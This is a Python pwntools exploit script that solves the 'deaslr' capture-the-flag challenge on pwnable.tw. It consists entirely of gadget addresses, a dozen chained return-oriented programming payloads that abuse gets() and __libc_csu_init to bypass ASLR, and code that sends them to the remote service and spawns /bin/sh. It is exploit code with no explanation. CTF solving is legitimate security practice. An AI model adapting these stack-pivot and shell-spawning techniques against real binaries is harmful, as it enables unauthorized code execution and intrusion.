from pwn import *

binary=ELF("./deaslr")
bss=binary.bss()

#gadgets
pop_rdi_ret=			0x00000000004005c3
leave=				0x0000000000400554
pop_rsi_r15_ret=		0x00000000004005c1
rbx_rbp_r12_r13_r14_r15_ret=	0x0000000004005BA
do_call=			0x0000000004005A0
rsp_r13_r14_r15=		0x00000000004005bd
add_ebx_esi=			0x0000000000400509
gets_got=			0x000000000600ff0
gets_plt=			0x400430
pop_r15=			0x00000000004005c2
pop_rbp_ret=			0x00000000004004a0
csu_init=			0x000000000400560
sh=				0x601f00
#value
df=				-0x299f0
off=				-(0x7ffff7a7bd00-0x7ffff7a52390)
off=				off&0xffffffff
addr1=				bss+0x200
addr2=				bss+0x300
addr3=				bss+0x400
addr4=				bss+0x500
addr5=				bss+0x600
aim1=				0x601300#address of gets
aim2=				0x601404+8
aim3=				0x601628


# rop chains
p0=[
pop_rdi_ret,addr1,gets_plt,
pop_rdi_ret,addr2,gets_plt,
pop_rdi_ret,addr3,gets_plt,
pop_rdi_ret,addr5,gets_plt,
pop_rbp_ret,addr1-8,leave
]

p1=[
pop_rdi_ret,gets_got+24,gets_plt,
pop_rbp_ret,addr2-8,
rsp_r13_r14_r15,gets_got
]

p2=[
csu_init,pop_rbp_ret,addr3-0x8,leave
]

p3=[
pop_rdi_ret,aim1-0x8,gets_plt,
pop_rdi_ret,aim1+4*8,gets_plt,
pop_rbp_ret,aim1-0x8-0x8,leave
]

p4=[
leave
]

p5=[
rbx_rbp_r12_r13_r14_r15_ret,
]

p6=[
pop_rdi_ret,addr4,gets_plt,
pop_rbp_ret,0x601350-8,leave#0x601350 is address of add_ebx_esi -0x18
]

p7=[
pop_rsi_r15_ret,off,0,
add_ebx_esi,csu_init,
pop_rbp_ret,addr5-8,leave
]

p8=[
pop_rdi_ret,aim2-0x8,gets_plt,
pop_rdi_ret,aim2+6*8,gets_plt,
pop_rbp_ret,aim2-0x8-0x8,leave
]

p9=[
rbx_rbp_r12_r13_r14_r15_ret,
]
#bss=0x00601000
p10=[
pop_rdi_ret,aim3+4+0x28,gets_plt,
pop_rdi_ret,sh,gets_plt,
pop_rbp_ret,aim3+4+0x28-8,leave
]

p11=[
csu_init,
pop_rdi_ret,sh,
pop_rbp_ret,aim3-0x8,leave
]

#p=process("./deaslr",env={'LD_PRELOAD':"./libc"})
context.log_level='debug'
p=remote("chall.pwnable.tw",10402)

p.sendline("\x00"*24+
"".join(map(p64,p0))+"\n"+
"".join(map(p64,p1))+'\n'+
"".join(map(p64,p2))+'\n'+
"".join(map(p64,p3))+'\n'+
"".join(map(p64,p8))+'\n'+
"".join(map(p64,p4))+'\n'+
"".join(map(p64,p5))+'\n'+
"".join(map(p64,p6))+"\n"+
"".join(map(p64,p7))+'\n'+
"".join(map(p64,p9))[:-1]+'\n'+
"".join(map(p64,p10))+'\n'+
"".join(map(p64,p11))+'\n'+
'/bin/sh'+'\n'
)
p.interactive()
